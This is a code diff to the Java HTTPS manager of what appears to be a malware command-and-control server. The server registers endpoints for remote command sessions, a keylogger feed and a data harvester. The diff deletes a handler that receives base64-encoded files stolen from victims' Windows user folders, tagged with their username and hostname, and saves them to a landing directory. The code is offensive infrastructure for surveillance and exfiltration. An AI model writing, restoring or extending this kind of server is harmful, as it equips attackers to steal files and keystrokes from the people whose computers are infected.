@@ -137,10 +137,6 @@ public class HTTPSManager extends C2Interface {
 			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCMD), new HTTPSHandler(io));
 			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTLOGGER), keylogHandler);
 			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTLOGGER), keylogHandler);
-			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTEXFIL),
-					new ExfilHandler(properties.getProperty(Constants.DAEMONLZEXFIL)));
-			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTEXFIL),
-					new ExfilHandler(properties.getProperty(Constants.DAEMONLZEXFIL)));
 			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTHARVEST),
 					new HarvestHandler(harvester));
 			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTHARVEST),
@@ -207,62 +203,6 @@ public class HTTPSManager extends C2Interface {
 			exchange.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
 			exchange.sendResponseHeaders(200, response.getBytes().length);
 			OutputStream os = exchange.getResponseBody();
-			os.write(response.getBytes());
-			os.close();
-		}
-	}
-
-	class ExfilHandler implements HttpHandler {
-
-		private String lz;
-
-		ExfilHandler(String lz) {
-			this.lz = lz;
-		}
-
-		@Override
-		public void handle(HttpExchange t) throws IOException {
-			String response = "acknowledged response";
-			if (t.getRequestMethod().equals("GET")) {
-				response = "GET not implemented";
-			} else if (t.getRequestMethod().equals("POST")) {
-				InputStreamReader isr = new InputStreamReader(t.getRequestBody(), "utf-8");
-				BufferedReader br = new BufferedReader(isr);
-				String rootPath = null;
-				String filename = null;
-				StringBuilder fileb64 = new StringBuilder();
-				String username = null;
-				String hostname = null;
-				String nextLine;
-				while ((nextLine = br.readLine()) != null) {
-					if (nextLine.startsWith("root:")) {
-						rootPath = nextLine.substring(5);
-					} else if (nextLine.startsWith("file:")) {
-						filename = nextLine.substring(5);
-					} else if (nextLine.startsWith("fileb64:")) {
-						fileb64.append(nextLine.substring(8));
-					} else if (nextLine.startsWith("username:")) {
-						username = nextLine.substring(9);
-					} else if (nextLine.startsWith("hostname:")) {
-						hostname = nextLine.substring(9);
-					} else {
-						// B64 encoder on the other end breaks lines up, concatenate with b64 file
-						fileb64.append(nextLine);
-					}
-				}
-
-				byte[] data = Base64.getDecoder().decode(fileb64.toString());
-				String localPath = hostname + username + File.separator + rootPath.substring("C:\\Users\\".length());
-				Files.createDirectories(Paths.get(lz + File.separator + localPath));
-				try (OutputStream stream = new FileOutputStream(
-						lz + File.separator + localPath + File.separator + filename)) {
-					stream.write(data);
-				}
-			}
-
-			t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
-			t.sendResponseHeaders(200, response.getBytes().length);
-			OutputStream os = t.getResponseBody();
 			os.write(response.getBytes());
 			os.close();
 		}
@@ -367,7 +307,7 @@ public class HTTPSManager extends C2Interface {
 					commandOutput.append(System.lineSeparator());
 				}
 				if (Constants.DEBUG) {
-					System.out.println("Session: " + sessionId + "submitted: " + commandOutput.toString());
+					System.out.println("Session: " + sessionId + ", submitted: " + commandOutput.toString());
 				}
 				io.sendIO(sessionId, commandOutput.toString());
 			}
